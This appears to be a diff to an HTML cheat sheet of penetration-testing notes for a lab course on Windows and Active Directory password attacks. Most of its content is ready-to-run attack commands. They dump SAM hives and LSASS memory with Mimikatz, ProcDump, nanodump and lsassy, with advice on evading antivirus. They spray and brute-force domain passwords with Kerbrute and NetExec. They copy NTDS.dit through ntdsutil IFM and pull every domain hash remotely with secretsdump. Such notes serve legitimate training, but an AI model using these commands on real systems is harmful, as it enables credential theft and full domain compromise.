@@ -327,6 +327,14 @@ reg.exe save hklm\security C:\security.save</code></pre></div>
                     <summary><span class="pc-node-label">Which hive holds what</span></summary>
                     <div class="pc-node-body"><p>SAM, SYSTEM and SECURITY each play a part in dumping and cracking; the registry-hives table below says what each one holds and why you need it.</p></div>
                   </details>
+                </li>
+                <li class="pc-node is-console" id="pcnode-wc-hives-alt">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Other SAM routes (remote, no reg.exe)</span></summary>
+                    <div class="pc-node-body"><p>reg.exe save is the manual route; there are quicker ones. Impacket&#39;s secretsdump pulls the SAM over SMB in one shot from credentials or a hash, with no files left on disk (remote registry plus a temporary service). NetExec&#39;s --sam does the same and writes the hashes to its logs. On an interactive box Mimikatz reads them live with lsadump::sam. From PowerShell, PowerSploit&#39;s Invoke-PowerDump dumps SAM without touching reg.exe. With SeBackupPrivilege but not full admin, robocopy /b copies the locked hive files out.</p><pre class="pc-cmd"><code>secretsdump.py ILF.local/jmarston:&#39;P@ssword!&#39;@10.129.42.197
+netexec smb 10.129.42.197 --local-auth -u bob -p &#39;HTB_@cademy_stdnt!&#39; --sam
+mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</code></pre></div>
+                  </details>
                 </li></ul>
               </li>
               <li class="pc-node is-console" id="pcnode-wc-transfer">
@@ -383,6 +391,16 @@ netexec smb 10.129.42.198 --local-auth -u bob -p &#39;HTB_@cademy_stdnt!&#39; --
                     <div class="pc-node-body"><p>Two methods built into Windows. With an interactive desktop: Task Manager, Processes tab, right-click Local Security Authority Process, Create dump file, which writes lsass.DMP to %temp%. From a shell: rundll32 calls comsvcs.dll&#39;s MiniDump function, which needs the LSASS PID first (tasklist /svc, or Get-Process lsass). Run it from an elevated prompt. The comsvcs route is faster and needs no GUI, but AV usually recognises it.</p><pre class="pc-cmd"><code>tasklist /svc
 Get-Process lsass
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node" id="pcnode-wc-lsass-more">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">If comsvcs is blocked: other dumpers</span></summary>
+                    <div class="pc-node-body"><p>When AV kills the comsvcs route, reach for an alternative. ProcDump (a signed Sysinternals binary, often allow-listed) writes a full dump with -ma. nanodump and dumpert evade the common usermode hooks. From PowerShell with no extra binary, PowerSploit&#39;s Out-Minidump dumps the process. Remotely over SMB with local admin, NetExec&#39;s lsassy module dumps and parses LSASS in one step. And if you can run Mimikatz live, sekurlsa::logonpasswords reads the secrets straight from memory with no dump on disk. Pick whichever your AV lets through.</p><pre class="pc-cmd"><code>procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp
+nanodump.exe --write C:\lsass.dmp
+powershell -c &quot;Import-Module .\Out-Minidump.ps1; Get-Process lsass | Out-Minidump&quot;
+netexec smb 10.129.42.198 --local-auth -u bob -p &#39;HTB_@cademy_stdnt!&#39; -M lsassy
+mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</code></pre></div>
                   </details>
                 </li>
                 <li class="pc-node" id="pcnode-wc-lsass-exfil">
@@ -442,16 +460,19 @@ mimikatz # sekurlsa::credman</code></pre></div>
                 <ul class="pc-tree">
                 <li class="pc-node is-console" id="pcnode-ad-usernames">
                   <details class="pc-node-box">
-                    <summary><span class="pc-node-label">Build &amp; validate usernames</span></summary>
-                    <div class="pc-node-body"><p>Usernames follow a convention (jdoe, jane.doe, doe.jane), often visible in an email address (jdoe@corp means jdoe) or scraped from the company site and social media. Turn real names into candidates by hand or with username-anarchy, then confirm which actually exist with Kerbrute&#39;s userenum against the DC, so you only spray real accounts. The conventions are in the table below.</p><pre class="pc-cmd"><code>./username-anarchy -i names.txt &gt; usernames.txt
+                    <summary><span class="pc-node-label">Find the domain &amp; build usernames</span></summary>
+                    <div class="pc-node-body"><p>First, name the domain. An nmap scan of the KDC and LDAP ports reads the realm from krb5-enum-users and the LDAP root DSE, so you have the --domain value for everything below; enum4linux-ng, or netexec smb &lt;dc&gt; with no creds, prints it too. Then usernames: they follow a convention (jdoe, jane.doe, doe.jane), often visible in an email address (jdoe@corp means jdoe) or scraped from the company site. Turn real names into candidates by hand or with username-anarchy, then confirm which exist with Kerbrute&#39;s userenum (Kerberos pre-auth, no login attempt, so it is quiet and cannot lock accounts). The conventions are in the table below.</p><pre class="pc-cmd"><code>nmap -p 88,389 --script krb5-enum-users,ldap-rootdse 10.129.201.57
+netexec smb 10.129.201.57
+./username-anarchy -i names.txt &gt; usernames.txt
 ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain corp.local usernames.txt</code></pre></div>
                   </details>
                 </li>
                 <li class="pc-node is-console" id="pcnode-ad-brute">
                   <details class="pc-node-box">
-                    <summary><span class="pc-node-label">Guess passwords (NetExec)</span></summary>
-                    <div class="pc-node-body"><p>With valid usernames, brute or spray them against the DC over SMB with NetExec. Mind account lockout (not enabled by default in AD, so many environments are exposed to this); every attempt logs Event ID 4776 on the DC, so it is far from quiet.</p><pre class="pc-cmd"><code>netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
-netexec smb 10.129.201.57 -u usernames.txt -p &#39;Welcome1&#39; --continue-on-success</code></pre></div>
+                    <summary><span class="pc-node-label">Guess passwords (NetExec or Kerbrute)</span></summary>
+                    <div class="pc-node-body"><p>With valid usernames, brute or spray them. NetExec over SMB is the obvious route, but each attempt logs Event ID 4776 and counts toward lockout. When SMB is filtered or you want to stay quieter, Kerbrute does it over Kerberos (AS-REQ pre-auth): passwordspray tries one password across every user (stays under lockout), bruteuser tries a wordlist against one user you already trust, and a hit prints the plaintext. Mind account lockout either way (not enabled by default in AD, so many environments are exposed).</p><pre class="pc-cmd"><code>netexec smb 10.129.201.57 -u usernames.txt -p &#39;Welcome1&#39; --continue-on-success
+./kerbrute_linux_amd64 passwordspray --dc 10.129.201.57 -d corp.local usernames.txt &#39;Welcome1&#39;
+./kerbrute_linux_amd64 bruteuser --dc 10.129.201.57 -d corp.local /usr/share/wordlists/fasttrack.txt jmarston</code></pre></div>
                   </details>
                 </li>
                 <li class="pc-node is-console" id="pcnode-ad-foothold">
@@ -464,18 +485,19 @@ net user bwilliamson</code></pre></div>
                 </li>
                 <li class="pc-node is-console" id="pcnode-ad-vss">
                   <details class="pc-node-box">
-                    <summary><span class="pc-node-label">Copy NTDS.dit (shadow copy)</span></summary>
-                    <div class="pc-node-body"><p>NTDS.dit is locked while AD runs, so copy it out of a Volume Shadow Copy instead: vssadmin creates a snapshot of C: that can be read live, and you copy ntds.dit from the shadow volume. Grab the SYSTEM hive too, the hashes are encrypted with its boot key and will not decrypt without it.</p><pre class="pc-cmd"><code>vssadmin CREATE SHADOW /For=C:
+                    <summary><span class="pc-node-label">Copy NTDS.dit (VSS, or ntdsutil IFM)</span></summary>
+                    <div class="pc-node-body"><p>NTDS.dit is locked while AD runs, so you cannot copy it directly. vssadmin creates a shadow copy of C: that can be read live, and you copy ntds.dit from the shadow volume. Grab the SYSTEM hive too, the hashes are encrypted with its boot key and will not decrypt without it. Two fallbacks if vssadmin is blocked or missing: diskshadow scripts the same snapshot (handy on Server where vssadmin is locked down), and ntdsutil&#39;s IFM (Install From Media) writes a clean, consistent copy of NTDS.dit plus the SYSTEM hive to a folder in one command, no shadow copy to clean up.</p><pre class="pc-cmd"><code>vssadmin CREATE SHADOW /For=C:
 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
-reg.exe save hklm\system C:\NTDS\SYSTEM</code></pre></div>
+reg.exe save hklm\system C:\NTDS\SYSTEM
+ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:\temp&quot; q q</code></pre></div>
                   </details>
                 </li>
                 <li class="pc-node is-console" id="pcnode-ad-extract">
                   <details class="pc-node-box">
-                    <summary><span class="pc-node-label">Extract the hashes</span></summary>
-                    <div class="pc-node-body"><p>Move NTDS.dit and SYSTEM to the attack host over an smbserver share, then dump with Impacket&#39;s secretsdump. Faster: skip the manual copy entirely and let NetExec run the whole VSS-and-dump remotely with its ntdsutil module. Either way you get every domain hash, krbtgt and the machine accounts included.</p><pre class="pc-cmd"><code>cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
-impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
-netexec smb 10.129.201.57 -u bwilliamson -p &#39;P@55w0rd!&#39; -M ntdsutil</code></pre></div>
+                    <summary><span class="pc-node-label">Extract the hashes (three methods)</span></summary>
+                    <div class="pc-node-body"><p>Three ways to turn the files, or the DC itself, into hashes. (1) Local: move the copied NTDS.dit and SYSTEM to the attack host over an smbserver share and run secretsdump against them with LOCAL. (2) Remote one-shot: point secretsdump straight at the DC with Domain Admin credentials and -just-dc-ntlm for just the NT hashes (uses DRSUAPI, no manual copy). (3) NetExec: its ntdsutil module runs the whole snapshot-and-dump on the DC and pulls the hashes back. Any route gives every domain hash, krbtgt and the machine accounts included, in pwdump format (user:rid:lm:nt).</p><pre class="pc-cmd"><code>impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+secretsdump.py ILF.local/jmarston:&#39;P@ssword!&#39;@10.129.201.57 -just-dc-ntlm
+netexec smb 10.129.201.57 -u jmarston -p &#39;P@ssword!&#39; -d ILF.local -M ntdsutil</code></pre></div>
                   </details>
                 </li>
                 <li class="pc-node is-console" id="pcnode-ad-pth">
